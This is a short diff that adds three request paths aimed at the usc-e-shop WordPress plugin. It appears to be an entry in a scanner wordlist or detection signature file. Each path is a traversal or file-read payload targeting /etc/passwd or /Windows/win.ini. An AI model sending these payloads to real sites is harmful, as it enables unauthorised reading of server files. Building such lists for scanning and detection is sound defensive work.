@@ -1,0 +1,3 @@
+/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd
+/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd
+/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/Windows/win.ini
